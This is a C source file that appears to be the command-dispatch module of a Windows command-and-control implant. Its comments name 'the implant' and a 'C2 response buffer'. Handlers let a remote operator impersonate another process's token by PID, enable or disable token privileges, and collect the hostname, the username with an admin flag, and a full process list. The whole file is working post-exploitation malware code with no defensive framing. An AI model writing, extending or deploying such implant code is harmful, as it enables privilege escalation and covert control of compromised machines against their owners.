#include "command.h"

#define UTF8_WIDE_NULL_TERMINATOR_COUNT 1U

/* Maps each generated command identifier to its synchronous command handler. */
CONST COMMAND_MAP G_CommandTable[] = {
	{ CMD_INSPECT_TOKEN, CmdInspectToken },
	{ CMD_IMPERSONATE_TOKEN, CmdImpersonateToken },
	{ CMD_ENABLE_PRIVILEGE, CmdEnablePrivilege },
	{ CMD_DISABLE_PRIVILEGE, CmdDisablePrivilege },
	{ CMD_HOSTNAME, CmdHostname },
	{ CMD_WHOAMI, CmdWhoami},
	{ CMD_PS, CmdPs},
	{ CMD_GETPID, CmdGetPid}

};

/**
 * @brief Converts a UTF-8 byte buffer into a heap-allocated wide string.
 *
 * @param dataLen The length of the UTF-8 input buffer in bytes.
 * @param data The UTF-8 input buffer.
 * @param wideString Receives the heap-allocated wide string on success.
 *
 * @return NO_ERROR on success, or a numeric error code on failure.
 */
static DWORD ConvertUtf8ToWideString(
	DWORD dataLen,
	CONST PBYTE data,
	PWSTR* wideString
)
{
	INT wideCharCount = 0;
	PWSTR buffer = NULL;

	ASSERT(wideString != NULL);

	*wideString = NULL;
	if (data == NULL || dataLen == 0)
	{
		return ERROR_INVALID_REQUEST;
	}

	wideCharCount = MultiByteToWideChar(
		CP_UTF8,
		0,
		(LPCCH)data,
		(INT)dataLen,
		NULL,
		0
	);
	if (wideCharCount <= 0)
	{
		return ERROR_INVALID_REQUEST;
	}

	buffer = (PWSTR)ImplantHeapAlloc(
		((SIZE_T)wideCharCount + UTF8_WIDE_NULL_TERMINATOR_COUNT) *
		sizeof(WCHAR)
	);
	if (buffer == NULL)
	{
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	if (MultiByteToWideChar(
		CP_UTF8,
		0,
		(LPCCH)data,
		(INT)dataLen,
		buffer,
		wideCharCount
	) <= 0)
	{
		ImplantHeapFree(buffer);
		return ERROR_INVALID_REQUEST;
	}

	buffer[wideCharCount] = L'\0';
	*wideString = buffer;
	return NO_ERROR;
}

DWORD CmdInspectToken(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	UNREFERENCED_PARAMETER(dataLen);
	UNREFERENCED_PARAMETER(data);

	return BuildCurrentTokenSummaryResponse(responseData, responseLen);
}

DWORD CmdImpersonateToken(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD processId = 0;
	DWORD status = NO_ERROR;

	if (dataLen < sizeof(DWORD) || data == NULL)
	{
		return ERROR_INVALID_REQUEST;
	}

	processId = *(DWORD*)data;

	if (processId == 0 || processId % 4 != 0)
		return ERROR_INVALID_PID;

	//try to impersonate the token of given pid
	status = ImpersonateProcessToken(processId);

	//success: build the success data buffer
	if (status == NO_ERROR) {
		status = BuildTokenImpersonationResponseFromToken(processId, responseData, responseLen);
	}

	return status;
}

DWORD CmdEnablePrivilege(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD status = NO_ERROR;
	PWSTR privilegeName = NULL;

	status = ConvertUtf8ToWideString(dataLen, data, &privilegeName);
	if (status != NO_ERROR)
	{
		return status;
	}

	//check if privilege is already enabled
	if (IsPrivilegeEnabled(privilegeName))
	{
		status = BuildTokenEnablePrivilegeResponseFromToken(privilegeName,
			PRIV_ENABLE_SUCCESS,
			PRIV_ENABLED_PREVIOUSLY,
			responseData,
			responseLen);
	}
	else
	{
		//try to enable the privilege of current token
		status = EnableCurrentTokenPrivilege(privilegeName);

		//check if privilege name is valid
		if (status == ERROR_INVALID_PRIVILEGE)
		{
			goto cleanup;
		}
		//success: build the success data buffer
		if (status == NO_ERROR) {
			status = BuildTokenEnablePrivilegeResponseFromToken(privilegeName,
				PRIV_ENABLE_SUCCESS,
				PRIV_DISABLED_PREVIOUSLY,
				responseData,
				responseLen);
		}
		//failure: build the failure data buffer with the error code
		else
		{
			status = BuildTokenEnablePrivilegeResponseFromToken(privilegeName,
				status,
				PRIV_DISABLED_PREVIOUSLY,
				responseData,
				responseLen);
		}

	}
cleanup:
	ImplantHeapFree(privilegeName);
	return status;
}

DWORD CmdDisablePrivilege(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD status = NO_ERROR;
	PWSTR privilegeName = NULL;
	DWORD prevStatus = PRIV_DISABLED_PREVIOUSLY;

	status = ConvertUtf8ToWideString(dataLen, data, &privilegeName);
	if (status != NO_ERROR)
	{
		goto cleanup;
		
	}

	// check if the privilege is currently enabled, and save that state
	if (IsPrivilegeEnabled(privilegeName))
	{
		prevStatus = PRIV_ENABLED_PREVIOUSLY;
	}

	// try to disable the privilege of current token 
	status = DisableCurrentTokenPrivilege(privilegeName);

	// reuse enable priv builder response function
	if (status == NO_ERROR) {
		status = BuildTokenEnablePrivilegeResponseFromToken(
			privilegeName,
			PRIV_DISABLE_SUCCESS,
			prevStatus,
			responseData,
			responseLen);
	}
	else
	{
		status = BuildTokenEnablePrivilegeResponseFromToken(
			privilegeName,
			status,             
			prevStatus,
			responseData,
			responseLen);
	}

cleanup:
	if (privilegeName != NULL)
	{
		ImplantHeapFree(privilegeName);
	}
	return status;
}


DWORD CmdHostname(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	UNREFERENCED_PARAMETER(dataLen);
	UNREFERENCED_PARAMETER(data);

	DWORD status = NO_ERROR;

	// get the struct
	AllSI_t sysInfo = GetAllSystemInformation();

	if (!sysInfo.computerName) {
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	// calculate ONLY the size of the computer name (including null terminator)
	DWORD compBytes = (DWORD)(wcslen(sysInfo.computerName) + 1) * sizeof(WCHAR);

	// allocate response buffer
	PBYTE responseBuffer = (PBYTE)ImplantHeapAlloc(compBytes);
	if (responseBuffer == NULL) {
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	// copy ONLY the computer name into the buffer
	memcpy(responseBuffer, sysInfo.computerName, compBytes);

	*responseData = responseBuffer;
	*responseLen = compBytes;

cleanup:
	
	if (sysInfo.computerName) ImplantHeapFree(sysInfo.computerName);
	if (sysInfo.userName) ImplantHeapFree(sysInfo.userName);
	if (sysInfo.architecture) ImplantHeapFree(sysInfo.architecture);

	return status;
}

DWORD CmdWhoami(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	UNREFERENCED_PARAMETER(dataLen);
	UNREFERENCED_PARAMETER(data);

	DWORD status = NO_ERROR;

	AllSI_t sysInfo = GetAllSystemInformation();

	if (!sysInfo.userName) {
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	// calculate string size
	DWORD userBytes = (DWORD)(wcslen(sysInfo.userName) + 1) * sizeof(WCHAR);

	// buffer size: 4 bytes for the admin flag + the string length
	DWORD totalLength = sizeof(DWORD) + userBytes;

	PBYTE responseBuffer = (PBYTE)ImplantHeapAlloc(totalLength);
	if (responseBuffer == NULL) {
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	// pack the Admin flag, then the username string
	PBYTE offset = responseBuffer;

	*((DWORD*)offset) = (DWORD)sysInfo.admin;
	offset += sizeof(DWORD);

	memcpy(offset, sysInfo.userName, userBytes);

	*responseData = responseBuffer;
	*responseLen = totalLength;

cleanup:
	
	if (sysInfo.computerName) ImplantHeapFree(sysInfo.computerName);
	if (sysInfo.userName) ImplantHeapFree(sysInfo.userName);
	if (sysInfo.architecture) ImplantHeapFree(sysInfo.architecture);

	return status;
}

DWORD CmdPs(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	UNREFERENCED_PARAMETER(dataLen);
	UNREFERENCED_PARAMETER(data);

	DWORD status = NO_ERROR;
	PBYTE responseBuffer = NULL;

	// start with enough space to hold the total number of processes (1 DWORD)
	DWORD totalLength = sizeof(DWORD);
	WCHAR** processNames = NULL;

	if (responseData != NULL) *responseData = NULL;
	if (responseLen != NULL) *responseLen = 0;

	// get process information struct
	ProcessInfo_t psInfo = GetProcessInfo();

	if (psInfo.processArray == NULL || psInfo.numProcesses == 0) {
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	// allocate an array to hold all the process name pointers temporarily 
	// (so we only have to query the OS once per process)
	processNames = (WCHAR**)ImplantHeapAlloc(psInfo.numProcesses * sizeof(WCHAR*));
	if (processNames == NULL) {
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	// first pass: Fetch the names and calculate the exact payload size
	for (DWORD i = 0; i < psInfo.numProcesses; i++)
	{
		DWORD pid = psInfo.processArray[i];
		processNames[i] = GetProcessName(pid);

		DWORD nameBytes = 0;
		if (processNames[i] != NULL) {
			// calculate length of string + null terminator
			nameBytes = (DWORD)(wcslen(processNames[i]) + 1) * sizeof(WCHAR);
		}
		else {
			// if we lack permissions to get the name, just pack an empty string
			nameBytes = sizeof(WCHAR);
		}

		// add size: [DWORD pid] + [DWORD nameLength] + [WCHAR[] stringBytes]
		totalLength += sizeof(DWORD) + sizeof(DWORD) + nameBytes;
	}

	// allocate the C2 response buffer now that we know the exact size
	responseBuffer = (PBYTE)ImplantHeapAlloc(totalLength);
	if (responseBuffer == NULL) {
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	// pack the buffer sequentially
	PBYTE offset = responseBuffer;

	// pack the total number of processes at the very beginning
	*((DWORD*)offset) = psInfo.numProcesses;
	offset += sizeof(DWORD);

	// second pass: Pack the actual data
	for (DWORD i = 0; i < psInfo.numProcesses; i++)
	{
		DWORD pid = psInfo.processArray[i];
		DWORD nameBytes = processNames[i] ? (DWORD)(wcslen(processNames[i]) + 1) * sizeof(WCHAR) : sizeof(WCHAR);

		// Pack PID
		*((DWORD*)offset) = pid;
		offset += sizeof(DWORD);

		// Pack Name Length
		*((DWORD*)offset) = nameBytes;
		offset += sizeof(DWORD);

		// Pack Name String
		if (processNames[i] != NULL) {
			memcpy(offset, processNames[i], nameBytes);
		}
		else {
			// Put a manual null-terminator for empty strings
			((WCHAR*)offset)[0] = L'\0';
		}
		offset += nameBytes;
	}

	// assign output pointers
	*responseData = responseBuffer;
	*responseLen = totalLength;

cleanup:
	// Free all the individual process name strings we fetched
	if (processNames != NULL) {
		for (DWORD i = 0; i < psInfo.numProcesses; i++) {
			if (processNames[i] != NULL) {
				ImplantHeapFree(processNames[i]);
			}
		}
		// Free the temporary array itself
		ImplantHeapFree(processNames);
	}

	// Free the PID array returned by GetProcessInfo
	if (psInfo.processArray != NULL) {
		ImplantHeapFree(psInfo.processArray);
	}

	// If anything failed, clean up the main C2 buffer to prevent memory leaks
	if (status != NO_ERROR && responseBuffer != NULL) {
		ImplantHeapFree(responseBuffer);
		if (responseData != NULL) *responseData = NULL;
		if (responseLen != NULL) *responseLen = 0;
	}

	return status;
}

DWORD CmdGetPid(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	UNREFERENCED_PARAMETER(dataLen);
	UNREFERENCED_PARAMETER(data);

	DWORD status = NO_ERROR;
	PBYTE responseBuffer = NULL;
	DWORD totalLength = sizeof(DWORD);

	if (responseData != NULL) *responseData = NULL;
	if (responseLen != NULL) *responseLen = 0;

	// allocate a 4-byte buffer
	responseBuffer = (PBYTE)ImplantHeapAlloc(totalLength);
	if (responseBuffer == NULL) {
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	// get the implant's current PID and pack it directly into the buffer
	*((DWORD*)responseBuffer) = GetCurrentProcessId();

	// assign the output pointers
	*responseData = responseBuffer;
	*responseLen = totalLength;

	return status;
}

DWORD ExecuteCommandById(
	DWORD cmdId,
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	for (DWORD i = 0; i < ARRAYSIZE(G_CommandTable); i++)
	{
		if ((DWORD)G_CommandTable[i].id == cmdId)
		{
			return G_CommandTable[i].handler(
				dataLen,
				data,
				responseData,
				responseLen
			);
		}
	}

	return ERROR_UNKNOWN_COMMAND;
}
